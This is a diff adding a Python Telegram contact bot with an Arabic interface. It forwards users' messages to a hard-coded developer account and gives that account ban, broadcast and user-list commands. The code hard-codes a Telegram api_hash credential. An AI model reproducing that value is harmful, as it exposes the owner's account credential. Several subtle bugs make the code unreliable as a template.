+api_hash="03488b3c030fe095667e7ca22fe34954",
+bot_token=Config.TG_BOT_TOKEN)
+
+
+
+REB = ReplyKeyboardMarkup([
+	[("تفعيل التواصل"),("تعطيل التواصل")],
+	[("الاحصائيات"),("اذاعه للكل")],
+	[("الغاء حظر عضو"),("حظر عضو")],
+	[("الغاء")]],
+	resize_keyboard=True)
+
+@b3kkk.on_message(filters.command("start") & filters.private)
+async def START(c:Client,m:Message):
+	UserName = m.from_user.username
+	UserName = "@"+UserName if UserName else "There in no username"
+	db.execute("SELECT * FROM USERS WHERE user_id = ?", (m.from_user.id,))
+	result = db.fetchone()
+	
+	if m.from_user.id == 5154904380:
+		await m.reply("اليك لوحه المطور",reply_markup=REB,quote=True)
+	elif CHECK_BAND(user_id=m.from_user.id):
+		await m.reply("**تم حظرك من استخدام البوت**",quote=True)
+	elif result:
+		await m.reply(f"""
+		مرحبا {m.from_user.mention}
+	
+	في بوت التواصل الخاص بي
+	ارسل رسالتك وسيتم الرد عليك قريبا
+		""",reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ("Dev",user_id=5154904380)]]),quote= True)
+	else:
+		db.execute("INSERT INTO USERS(user_id) VALUES(?)", (m.from_user.id,))
+		con.commit()
+		try:
+			await b3kkk.send_message(5154904380,f"""
+		<u>«**New User**»</u>
+		
+	➣ Name : {m.from_user.first_name}
+	➣ User Name : {UserName}
+	➣ User Id : `{m.from_user.id}`
+	➣ Link : [Link Profile](tg://user?id=m.from.user.id)
+	➣ Data : **{date.today()}**
+		""",reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (m.from_user.first_name,user_id=m.from_user.id)],[InlineKeyboardButton("حظر هذا العضو",callback_data=f"Ban:{m.from_user.id}")]]))
+		except:pass
+		await m.reply(f"""
+		مرحبا {m.from_user.mention}
+	
+	في بوت التواصل الخاص بي
+	ارسل رسالتك وسيتم الرد عليك قريبا
+		""",reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ("Dev",user_id=5154904380)]]),quote= True)
+		
+
+	
+@b3kkk.on_message(filters.command("تفعيل التواصل","") & filters.user(5154904380) & filters.private)
+async def OnTw(c:Client,m:Message):
+	db.execute("SELECT * FROM TWSEL WHERE chat_id = ?", (123456489,))
+	result = db.fetchone()
+	if result:
+		await m.reply(f"مطوري {m.from_user.mention}\nتم تفعيل التواصل من قبل",quote=True)
+	else:
+		db.execute("INSERT INTO TWSEL(chat_id) VALUES(?)", (123456489,))
+		con.commit()
+		await m.reply(f"مطوري {m.from_user.mention}\nتم تفعيل التواصل",quote=True)
+
+@b3kkk.on_message(filters.command("تعطيل التواصل","") & filters.user(5154904380) & filters.private)
+async def OffTw(c:Client,m:Message):
+	db.execute("SELECT * FROM TWSEL WHERE chat_id = ?", (123456489,))
+	result = db.fetchone()
+	
+	if result is not None:
+		db.execute("DELETE FROM TWSEL WHERE chat_id = ?", (123456489,))
+		con.commit()
+		await m.reply(f"مطوري {m.from_user.mention}\nتم تعطيل التواصل",quote=True)
+	else:
+		await m.reply(f"مطوري {m.from_user.mention}\nتم تعطيل التواصل من قبل",quote=True)
+
+
+@b3kkk.on_message(filters.command("الاحصائيات","") & filters.user(5154904380) & filters.private)
+async def StatTw(c:Client,m:Message):
+	Wait = await m.reply("Wait a second")
+	time.sleep(.5)
+	Users = GET_USERS()
+	with open("Users.txt","w") as file:
+		for User in Users:
+			file.write(str(User)+"\n")
+	READ = open("Users.txt","rb")
+	Users = GET_BAN_USERS()
+	with open("Ban_Users.txt","w") as file:
+		for User in Users:
+			file.write(str(User)+"\n")
+	READ2 = open("Ban_Users.txt","rb")
+	await Wait.delete()
+	try:	
+		await m.reply_document(READ,caption="**<u>➣ User Stats  </u>**")
+		os.remove("Users.txt")
+	except:os.remove("Users.txt")
+	try:	
+		await m.reply_document(READ2,caption="**<u>➣ Ban User Stats  </u>**")
+		os.remove("Ban_Users.txt")
+	except:os.remove("Ban_Users.txt")
+
+
+@b3kkk.on_message(filters.command("اذاعه للكل","") & filters.user(5154904380) & filters.private)
+async def Broad(c:Client,m:Message):
+	db.execute("SELECT * FROM USERS")
+	users = len(db.fetchall())
+	con.commit()
+	if users < 1:
+		await m.reply("➣**<u>لا يوجد مستخدمين ليتم الاذاعه لهم</u>**")
+	else:
+		Msg = await m.chat.ask("**ارسل الان نص الاذاعه**\nللالغاء ارسل `الغاء` اضغط للنسخ",
+		reply_markup=ForceReply())
+		if Msg.text == "الغاء":
+			return await m.reply("**تم الغاء الاذاعه**",reply_markup=REB)
+		REP = await m.reply("**انتظر يتم الاذاعه الان**")
+		for user in GET_USERS():
+			try:
+				await Msg.copy(int(user))
+			except:pass
+		await REP.delete()
+		await m.reply(f"➣\n**<u> تم الاذاعه الي {users} من الاعضاء</u>**",reply_markup=REB)
+
+
+@b3kkk.on_message(filters.command("حظر عضو","") & filters.user(5154904380) & filters.private)
+async def Ban(c:Client,m:Message):
+	Msg = await m.chat.ask("**ارسل الان ايدي العضو المراد حظره**",reply_markup=ForceReply())
+	if Msg.text == "الغاء":
+		return await m.reply("**تم الغاء الامر**",reply_markup=REB)
+	if Msg.text == m.from_user.id:
+		return await m.reply("**لا يمكنك حظر نفسك**")
+	try:
+		if CHECK_BAND(user_id=Msg.text):
+			return await m.reply("**هذا المستخدم محظور من قبل**",reply_markup=REB)
+	except ValueError:
+		return await m.reply("**ارسل ايدي صالح للاستخدام في التلجرام**",reply_markup=REB)
+	try:
+		ADD_BAN(user_id=int(Msg.text))
+		return await m.reply(f"**تم حظر {Msg.text} من البوت",reply_markup=REB)
+	except ValueError:
+		return await m.reply("**ارسل ايدي صالح للاستخدام في التلجرام**",reply_markup=REB)
+	
+@b3kkk.on_message(filters.command("الغاء حظر عضو","") & filters.user(5154904380) & filters.private)
+async def UnBan(c:Client,m:Message):
+	Msg = await m.chat.ask("**ارسل الان ايدي العضو المراد الغاء حظره**",reply_markup=ForceReply())
+	if Msg.text == "الغاء":
+		return await m.reply("**تم الغاء الامر**",reply_markup=REB)
+	if Msg.text == m.from_user.id:
+		return await m.reply("**لا يمكنك الغاء حظر نفسك**")
+	try:
+		if not CHECK_BAND(user_id=Msg.text):
+			return await m.reply("**هذا المستخدم لم يتم حظره من قبل**",reply_markup=REB)
+	except ValueError:
+		return await m.reply("**ارسل ايدي صالح للاستخدام في التلجرام**",reply_markup=REB)
+	try:
+		DEL_BAN(user_id=int(Msg.text))
+		return await m.reply(f"**تم الغاء حظر {Msg.text} من البوت",reply_markup=REB)
+	except ValueError:
+		return await m.reply("**ارسل ايدي صالح للاستخدام في التلجرام**",reply_markup=REB)
+	try:
+		await b3kkk.send_message(Msg.text,f"**مرحبا {Msg.text} تم الغاء حظرك من البوت بنجاح")
+	except:pass
+
+
+@b3kkk.on_message(filters.private & ~filters.command("start") & ~filters.user(5154904380))
+async def Private(c:Client,m:Message):
+	db.execute("SELECT * FROM TWSEL WHERE chat_id = ?", (123456489,))
+	result = db.fetchone()
+	
+	if CHECK_BAND(user_id=m.from_user.id):
+		await m.reply("**تم حظرك من استخدام البوت**",quote=True)
+	elif result is None:
+		await m.reply("**عذرا التواصل معطل من قبل مطور البوت**",quote=True)
+	else:
+		await b3kkk.copy_message(chat_id=5154904380,
+		from_chat_id=m.chat.id,message_id=m.id,
+		reply_markup=InlineKeyboardMarkup([[
+		InlineKeyboardButton (m.from_user.first_name,
+		user_id=m.from_user.id)],[
+		InlineKeyboardButton("الرد علي العضو",
+		callback_data=f"Reply:{m.from_user.id}")],[
+		InlineKeyboardButton("حظر هذا العضو",
+		callback_data=f"Ban:{m.from_user.id}")]
+		]))
+		await m.reply("**تم استلام رسالتك انتظر الرد**",quote=True)
+
+@b3kkk.on_callback_query(filters.regex(f"Ban:") & ~filters.regex(f"Reply:"))
+async def BanInli(c: Client, query: CallbackQuery):
+	ID = int(query.data.split(":")[1])
+	KEY = InlineKeyboardMarkup([[
+	InlineKeyboardButton ("الدخول للعضو المحظور",user_id=ID)]])
+	ADD_BAN(user_id=ID)
+	try:
+		await query.message.edit_text(f"**تم حظر `{ID}` من البوت**",reply_markup=KEY)
+	except:pass
+
+@b3kkk.on_callback_query(~filters.regex(f"Ban:") & filters.regex(f"Reply:"))
+async def Reply(c: Client, query: CallbackQuery):
+	ID = int(query.data.split(":")[1])
+	
+	a = await query.message.chat.ask("** ارسل الان مضون الرساله لارسلها للشخص**")
+	
+	try:
+		await b3kkk.send_message(chat_id=ID, text=str(a.text))
+		await query.message.reply("**تم ارسال رسالتك**",quote=True)
+	except Exception as e:
+			await query.message.reply("**يسمح فقط بارسال نص فقط ولا يمسح باي شي ثاني\n\nError:**\n"+str(e))
+	
+			
+
+print("😉")
+b3kkk.run()
